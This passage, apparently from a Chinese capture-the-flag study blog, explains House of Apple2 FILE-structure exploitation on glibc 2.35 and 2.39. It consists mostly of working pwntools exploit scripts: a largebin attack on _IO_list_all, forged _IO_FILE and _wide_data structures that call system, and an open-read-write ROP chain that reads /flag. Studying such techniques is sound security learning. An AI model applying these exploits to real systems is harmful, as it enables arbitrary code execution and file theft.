class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x450</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x428</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x440</span>)</span><br><span class="line">edit(<span class="number">1</span>,b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x420</span>+b<span class="string">&#x27; sh;&#x27;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)        </span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, b<span class="string">&#x27;\x00&#x27;</span>))<span class="number">-0x21b0e0</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line">edit(<span class="number">0</span>,b<span class="string">&#x27;a&#x27;</span>*<span class="number">15</span>+b<span class="number">&#x27;b</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">show(0)</span></span><br><span class="line"><span class="string">p.recvuntil(b&#x27;</span>ab<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">addr2 = u64(p.recv(6).ljust(8, b&#x27;</span>\x00<span class="string">&#x27;)) #0</span></span><br><span class="line"><span class="string">addr1 = addr2+0x890 #2</span></span><br><span class="line"><span class="string">_IO_wfile_jumps = libc_base+libc.sym[&#x27;</span>_IO_wfile_jumps<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">listall = libc_base + libc.sym[&#x27;</span>_IO_list_all<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">system = libc_base +libc.sym[&#x27;</span>system<span class="string">&#x27;]</span></span><br><span class="line"><span class="string">log.success(&quot; listall --&gt; &quot;+hex(listall))</span></span><br><span class="line"><span class="string">ogg = libc_base +0xebc81 #0xebc85 0xebc88 0xebc88 0xebd38 0xebd3f 0xebd43</span></span><br><span class="line"><span class="string">#bug()</span></span><br><span class="line"><span class="string">edit(0,p64(0)*3+p64(listall-0x20))</span></span><br><span class="line"><span class="string">add(4,0x500)</span></span><br><span class="line"><span class="string">#bug()</span></span><br><span class="line"><span class="string">#fake_io = p64(0) #flags </span></span><br><span class="line"><span class="string">#fake_io += p64(0)#IO read ptr</span></span><br><span class="line"><span class="string">fake_io = p64(0)#IO read end</span></span><br><span class="line"><span class="string">fake_io += p64(0)#I0 read base</span></span><br><span class="line"><span class="string">fake_io += p64(0)#IO write base</span></span><br><span class="line"><span class="string">fake_io += p64(1)#IO write ptr</span></span><br><span class="line"><span class="string">fake_io += p64(0)#IO write end</span></span><br><span class="line"><span class="string">fake_io += p64(0)#IO buf base</span></span><br><span class="line"><span class="string">fake_io += p64(0)#IO buf end</span></span><br><span class="line"><span class="string">fake_io += p64(0)#_IO_save_base</span></span><br><span class="line"><span class="string">fake_io += p64(0)#_IO_backup_base</span></span><br><span class="line"><span class="string">fake_io += p64(0)#_IO_save_end</span></span><br><span class="line"><span class="string">fake_io += p64(0)#_markers</span></span><br><span class="line"><span class="string">fake_io += p64(0)#chain</span></span><br><span class="line"><span class="string">fake_io += p64(0)</span></span><br><span class="line"><span class="string">fake_io += p64(0xffffffffffffffff)#old_offset</span></span><br><span class="line"><span class="string">fake_io += p64(0)</span></span><br><span class="line"><span class="string">fake_io += p64(addr1)</span></span><br><span class="line"><span class="string">fake_io += p64(0)*2</span></span><br><span class="line"><span class="string">fake_io += p64(addr2)#_wide_data</span></span><br><span class="line"><span class="string">fake_io += p64(0)*6</span></span><br><span class="line"><span class="string">fake_io += p64(_IO_wfile_jumps)#vtable</span></span><br><span class="line"><span class="string">edit(2,fake_io)</span></span><br><span class="line"><span class="string">fake_jump = b&#x27;</span>a<span class="string">&#x27;*88+p64(ogg)</span></span><br><span class="line"><span class="string">edit(0,p64(0)*11+p64(system)+p64(0)*14+p64(addr2))</span></span><br><span class="line"><span class="string">bug()</span></span><br><span class="line"><span class="string">p.sendline(b&#x27;</span><span class="number">5</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure>
+
+<p> p *(struct _IO_FILE_plus *)</p>
+<p><img src="/2025/11/18/IO/1757487139009-d1208a18-6c13-486b-8b0c-b8575a375f6c.png" alt="img"></p>
+<p><img src="/2025/11/18/IO/1757939145635-0a23f733-f8fa-468e-a9e1-10472b590f03.png" alt="img"></p>
+<p>还可以这样构造将wide_date 写heap1的头偏移0xe0(28)的地方写system 所在地址-0x68也就是heap1+0x80的地址</p>
+<p>这样只需要一个堆块就可以</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#fake_io = p64(<span class="number">0</span>) <span class="meta">#flags </span></span><br><span class="line">#fake_io += p64(<span class="number">0</span>)#IO read ptr</span><br><span class="line">fake_io = p64(<span class="number">0</span>)#IO read end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#I0 read base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO write base</span><br><span class="line">fake_io += p64(<span class="number">1</span>)#IO write ptr</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO write end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO buf base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO buf end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_save_base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_backup_base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_save_end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_markers</span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="meta">#chain</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0xffffffffffffffff</span>)#old_offset</span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_lock </span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io += p64(addr1)#_wide_data</span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_io += p64(_IO_wfile_jumps)<span class="meta">#vtable</span></span><br><span class="line">fake_io += p64(addr1+<span class="number">0x80</span>) #<span class="number">28</span>  #_wide_vtable</span><br><span class="line">fake_io += p64(system)          #__doallocate</span><br></pre></td></tr></table></figure>
+
+<h4 id="总结：结合前面的理解"><a href="#总结：结合前面的理解" class="headerlink" title="总结：结合前面的理解"></a>总结：结合前面的理解</h4><p>offset &#x3D; 0xe0这个位置就是wide_data的vtable </p>
+<p>p *(struct _IO_wide_data *)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  _IO_read_ptr = <span class="number">0x3b687320</span> &lt;error: Cannot access memory at address <span class="number">0x3b687320</span>&gt;,</span><br><span class="line">  _IO_read_end = <span class="number">0x451</span> &lt;error: Cannot access memory at address <span class="number">0x451</span>&gt;,</span><br><span class="line">  _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_end = <span class="number">0x1</span> &lt;error: Cannot access memory at address <span class="number">0x1</span>&gt;,</span><br><span class="line">  _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_backup_base = <span class="number">0x5555555592b0</span> <span class="string">L&quot;&quot;</span>,</span><br><span class="line">  _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_state = &#123;</span><br><span class="line">    __count = <span class="number">0</span>,</span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = <span class="number">0</span>,</span><br><span class="line">      __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _IO_last_state = &#123;</span><br><span class="line">    __count = <span class="number">0</span>,</span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = <span class="number">0</span>,</span><br><span class="line">      __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _codecvt = &#123;</span><br><span class="line">    __cd_in = &#123;</span><br><span class="line">      step = <span class="number">0x0</span>,</span><br><span class="line">      step_data = &#123;</span><br><span class="line">        __outbuf = <span class="number">0x0</span>,</span><br><span class="line">        __outbufend = <span class="number">0xffffffffffffffff</span> &lt;error: Cannot access memory at address <span class="number">0xffffffffffffffff</span>&gt;,</span><br><span class="line">        __flags = <span class="number">0</span>,</span><br><span class="line">        __invocation_counter = <span class="number">0</span>,</span><br><span class="line">        __internal_use = <span class="number">0</span>,</span><br><span class="line">        __statep = <span class="number">0x0</span>,</span><br><span class="line">        __state = &#123;</span><br><span class="line">          __count = <span class="number">0</span>,</span><br><span class="line">          __value = &#123;</span><br><span class="line">            __wch = <span class="number">0</span>,</span><br><span class="line">            __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    __cd_out = &#123;</span><br><span class="line">      step = <span class="number">0x555555559b20</span>,</span><br><span class="line">      step_data = &#123;</span><br><span class="line">        __outbuf = <span class="number">0x0</span>,</span><br><span class="line">        __outbufend = <span class="number">0x0</span>,</span><br><span class="line">        __flags = <span class="number">0</span>,</span><br><span class="line">        __invocation_counter = <span class="number">0</span>,</span><br><span class="line">        __internal_use = <span class="number">0</span>,</span><br><span class="line">        __statep = <span class="number">0x0</span>,</span><br><span class="line">        __state = &#123;</span><br><span class="line">          __count = <span class="number">0</span>,</span><br><span class="line">          __value = &#123;</span><br><span class="line">            __wch = <span class="number">0</span>,</span><br><span class="line">            __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _shortbuf = <span class="string">L&quot;\xf7e170c0&quot;</span>,</span><br><span class="line">  _wide_vtable = <span class="number">0x555555559ba0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>vtable偏移0xe8就是__doallocate  这里放system就会调用</p>
+<p>p *(struct _IO_jump_t *)</p>
+<p><img src="/2025/11/18/IO/1757486354064-108e5ed4-29ad-4860-8a85-cf4b5e2fce51.png" alt="img"></p>
+<h2 id="（2）2-35-House-of-Apple2（orw）"><a href="#（2）2-35-House-of-Apple2（orw）" class="headerlink" title="（2）2.35 House of Apple2（orw）"></a>（2）2.35 House of Apple2（orw）</h2><p>实现orw就是要栈迁移，因为需要pop，需要讲rsp迁到正确的地方</p>
+<p><img src="/2025/11/18/IO/1757518127314-c993502c-881b-4c06-9b7e-93f7db083874.png" alt="img"></p>
+<p><img src="/2025/11/18/IO/1757518150975-61d66abf-6fc8-4b62-9c12-e6322fc1b91d.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p svcudp_reply</span><br><span class="line">x/16i 0x7ffff7d6a050</span><br></pre></td></tr></table></figure>
+
+<p>主要靠的就是这一段代码</p>
+<p>从上面我们知道rdi就是heap1的头地址</p>
+<p>rdi+0x48 就是 _IO_save_base</p>
+<p>我们在_IO_save_base写什么 rbp就等于什么</p>
+<p>rax &#x3D; [rbp+0x18] </p>
+<p>我们需要在rbp+0x18的地方写一个地址作为rax</p>
+<p>然后会call [rax+0x28] </p>
+<p>因为前面要写orw，所以rax的值要大一些（heap2+0x200），为了避免orw的代码覆盖到rax+0x28</p>
+<h4 id="1-那么rax-0x28的地方写什么呢"><a href="#1-那么rax-0x28的地方写什么呢" class="headerlink" title="1.那么rax+0x28的地方写什么呢"></a>1.那么rax+0x28的地方写什么呢</h4><p>写leave_ret，我们控制了rbp，经过leave_ret,rsp &#x3D; rbp+8,我们讲orw的代码布置在rbp+8的地方就可以</p>
+<p>然后rbp+0x18的位置是rax的值，这个我们是不能变得，而且rbp+0x10的位置会被清零</p>
+<p>（<code>mov    dword ptr [rbp + 0x10], 0</code>）</p>
+<p>所以我们需要在rbp+0x8的地方写两个pop 将这两个废值pop 走</p>
+<p>然后后面接pop 接orw就可以</p>
+<h4 id="2-IO-save-base（rbp）该为多少"><a href="#2-IO-save-base（rbp）该为多少" class="headerlink" title="2._IO_save_base（rbp）该为多少"></a>2._IO_save_base（rbp）该为多少</h4><p>如果我们写heap2的地址，那么rbp+0x8的地方为size位，我们控制不了</p>
+<p>所以写heap2+0x10，这样rbp+0x8，就是数据的第二个位置，第一个位置写&#x2F;flag\x00\x00，第二个位置写两个pop</p>
+<p><img src="/2025/11/18/IO/1757517792150-b82c2e41-1537-440d-97ef-bd58c7ae40d1.png" alt="img"></p>
+<p><img src="/2025/11/18/IO/1757517831988-8910f821-62b9-4292-b3c6-a85df2d96711.png" alt="img"></p>
+<p><img src="/2025/11/18/IO/1757518150975-61d66abf-6fc8-4b62-9c12-e6322fc1b91d-1763442095814-63.png" alt="img"></p>
+<p><img src="/2025/11/18/IO/1757520030900-c1ae2be2-46fd-4eab-8f4c-5c15f837e957.png" alt="img"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">magic = libc_base+<span class="number">0x16a06a</span></span><br><span class="line">#fake_io = p64(<span class="number">0</span>) <span class="meta">#flags </span></span><br><span class="line">#fake_io += p64(<span class="number">0</span>)#IO read ptr</span><br><span class="line">fake_io = p64(<span class="number">0</span>)#IO read end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#I0 read base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO write base</span><br><span class="line">fake_io += p64(<span class="number">1</span>)#IO write ptr</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO write end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO buf base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#IO buf end</span><br><span class="line">fake_io += p64(addr2+<span class="number">0x10</span>)#_IO_save_base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_backup_base</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_IO_save_end</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_markers</span><br><span class="line">fake_io += p64(<span class="number">0</span>)<span class="meta">#chain</span></span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0xffffffffffffffff</span>)#old_offset</span><br><span class="line">fake_io += p64(<span class="number">0</span>)</span><br><span class="line">fake_io += p64(<span class="number">0</span>)#_lock </span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">fake_io += p64(addr1)#_wide_data</span><br><span class="line">fake_io += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_io += p64(_IO_wfile_jumps)<span class="meta">#vtable</span></span><br><span class="line">fake_io += p64(addr1+<span class="number">0x80</span>) #<span class="number">28</span></span><br><span class="line">fake_io += p64(magic) </span><br></pre></td></tr></table></figure>
+
+<p>最短leave_ret紧紧贴着0x30</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">orw = p64(rdi)+p64(addr2+<span class="number">0x10</span>)+p64(rsi)+p64(<span class="number">0</span>)+p64(rdx)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(openn)</span><br><span class="line">orw+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(addr2+<span class="number">0x300</span>)+p64(rdx)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(readd)</span><br><span class="line">orw+=p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(addr2+<span class="number">0x300</span>)+p64(rdx)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(writee)+p64(leave_ret)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span>+p64(r12)+p64(<span class="number">0</span>)+p64(addr2+<span class="number">0xc8</span>)+orw)</span><br><span class="line">leave_ret = pie +<span class="number">0x01412</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leave_ret))</span><br><span class="line">r12 = libc_base+<span class="number">0x011b768</span></span><br><span class="line">openn=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">readd=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">writee=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rdi=libc_base+<span class="number">0x002a3e5</span></span><br><span class="line">rsi=libc_base+<span class="number">0x02be51</span></span><br><span class="line">rdx=libc_base+<span class="number">0x11f2e7</span></span><br><span class="line">rax = libc_base +<span class="number">0x45eb0</span></span><br><span class="line">syscall = libc_base+<span class="number">0x029db4</span></span><br><span class="line">orw = p64(rdi)+p64(addr2+<span class="number">0x10</span>)+p64(rsi)+p64(<span class="number">0</span>)+p64(rdx)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(openn)</span><br><span class="line">orw+=p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(addr2+<span class="number">0x300</span>)+p64(rdx)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(readd)</span><br><span class="line">orw+=p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(addr2+<span class="number">0x300</span>)+p64(rdx)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(writee)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span>+p64(r12)+p64(addr2+<span class="number">0x200</span>)*<span class="number">2</span>+orw.ljust(<span class="number">0x1f8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(leave_ret))</span><br></pre></td></tr></table></figure>
+
+<h2 id="（3）2-35-House-of-Apple2（puts）"><a href="#（3）2-35-House-of-Apple2（puts）" class="headerlink" title="（3）2.35 House of Apple2（puts）"></a>（3）2.35 House of Apple2（puts）</h2><p>puts 原本调用链 </p>
+<p>_IO_file_xsputn –&gt; _IO_file_overflow  –&gt; _IO_do_write  –&gt; _IO_file_write  –&gt; write</p>
+<p>_IO_file_xsputn在虚表偏移0x38的位置</p>
+<p><img src="/2025/11/18/IO/1758027109912-2eff58c6-920a-439d-a5c5-43447fd83f43.png" alt="img"></p>
+<p>而_IO_file_overflow在虚表偏移0x18的位置</p>
+<p><img src="/2025/11/18/IO/1758027035874-7ca8ac7e-f05c-4538-8fc8-f6872dd5e005.png" alt="img"></p>
+<p>那么我们将虚表往前改0x20，那么puts调用_IO_file_xsputn调用偏移0x38的地方就会是_IO_file_overflow</p>
+<p>就和exit一样了</p>
+<p><img src="/2025/11/18/IO/1758027875904-8077351a-94a9-4c80-9722-3cd55442bdec.png" alt="img"></p>
+<p>但是进入puts，我们发现他并不是从_IO_list_all 中找stdout的结构体，这个结构体是在bss段上的，所以我们要将bss段上的结构体改了</p>
+<p>而exit走的是_IO_list_all</p>
+<p><img src="/2025/11/18/IO/1758028173345-0e30afe6-b43b-4d36-96e0-4d705580a33d.png" alt="img"></p>
+<p>问题：用largebin attack改bss段上他那个stdout的地址为堆块的地址，先用largebin attack，那个现在在unsortbin，要放的largebin的堆块是free的里面是空的，我改完调用puts就报错了，我要是先伪造好io结构体，然后挂进largebin他就会报错，然后我就给他那个fd和bk写了一下，他不报错了，但是那个_IO_read_end不是0了，不满足掉用条件了</p>
+<p><img src="/2025/11/18/IO/1758040085498-713e536f-00ba-42eb-9eef-eecf737c7c77.png" alt="img"></p>
+<p>那么如何满足条件呢？</p>
+<p>答案就是再来一个堆块伪造_wide_data这个结构体</p>
+<p>应为调用_IO_wfile_jumps看的是_wide_data这个结构体</p>
+<p>原本是将stdout与_wide_data伪造在一个地方，他们的数据是共用的，所以_IO_read_end不为0</p>
+<p>但是我们再来一个堆块就可以了</p>
+<p>我们需要先改完结构体在挂进链表，所以fd与bk要写好</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#stdout = p64(0) #flags </span></span><br><span class="line"><span class="comment">#stdout += p64(0)#IO read ptr</span></span><br><span class="line">stdout = p64(<span class="number">0x7ffff7e1ace0</span>)<span class="comment">#IO read end</span></span><br><span class="line">stdout += p64(<span class="number">0x7ffff7e1ace0</span>)<span class="comment">#I0 read base</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#IO write base</span></span><br><span class="line">stdout += p64(<span class="number">1</span>)<span class="comment">#IO write ptr</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#IO write end</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#IO buf base</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#IO buf end</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#_IO_save_base</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#_IO_backup_base</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#_IO_save_end</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#_markers</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)<span class="comment">#chain</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)</span><br><span class="line">stdout += p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#old_offset</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)</span><br><span class="line">stdout += p64(addr2+<span class="number">0x30</span>)<span class="comment">#_lock </span></span><br><span class="line">stdout += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">stdout += p64(addr1)<span class="comment">#_wide_data</span></span><br><span class="line">stdout += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">stdout += p64(_IO_wfile_jumps-<span class="number">0x20</span>)<span class="comment">#vtable</span></span><br><span class="line">edit(<span class="number">2</span>,stdout)</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是*_lock_addr &#x3D; 0</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#wide_data = p64(0) #flags </span></span><br><span class="line"><span class="comment">#wide_data += p64(0)#IO read ptr</span></span><br><span class="line">wide_data = p64(<span class="number">0</span>)<span class="comment">#IO read end</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#I0 read base</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#IO write base</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#IO write ptr</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#IO write end</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#IO buf base</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#IO buf end</span></span><br><span class="line">wide_data += p64(addr2+<span class="number">0x10</span>)<span class="comment">#_IO_save_base</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#_IO_backup_base</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#_IO_save_end</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#_markers</span></span><br><span class="line">wide_data += p64(addr1)<span class="comment">#chain</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)</span><br><span class="line">wide_data += p64(<span class="number">0xffffffffffffffff</span>)<span class="comment">#old_offset</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)</span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#_lock </span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)<span class="comment">#_wide_data</span></span><br><span class="line">wide_data += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">wide_data += p64(addr1+<span class="number">0x80</span>) <span class="comment">#28</span></span><br><span class="line">wide_data += p64(system) </span><br></pre></td></tr></table></figure>
+
+<p>stdout +&#x3D; p64(_IO_wfile_jumps-0x20)#vtable</p>
+<p>这里其实也不用变</p>
+<p>_IO_wfile_xsputn–&gt;_IO_wdefault_xsputn–&gt;_IO_wdoallocbuf–&gt;setcontext+61</p>
+<h2 id="（4）2-39-House-of-Apple2（system）"><a href="#（4）2-39-House-of-Apple2（system）" class="headerlink" title="（4）2.39 House of Apple2（system）"></a>（4）2.39 House of Apple2（system）</h2><p>exit-&gt;fcloseall-&gt;_IO_cleanup-&gt;_IO_flush_all-&gt;_IO_wfile_overflow-&gt;_IO_wdoallocbuf</p>
+<p>与2.35区别</p>
+<p>1.largebin 检查完善，挂入链表时候，也就是largebin attack时候要给fd bk fdnextsize改回去</p>
+<p>2.中间有一些操作导致结构体中数据被改，要绕开这些地址，防止结构体被改</p>
+<p><img src="/2025/11/18/IO/1758116454435-582e9806-913b-4b85-bb1c-bec33c5c272a.png" alt="img"></p>
+<p>0x55555555bb60就是lock</p>
+<p>他会对其赋值，所以不要让他改到</p>
+<p>_wide_data-&gt;_IO_write_base</p>
+<p>_wide_data-&gt;_IO_buf_base</p>
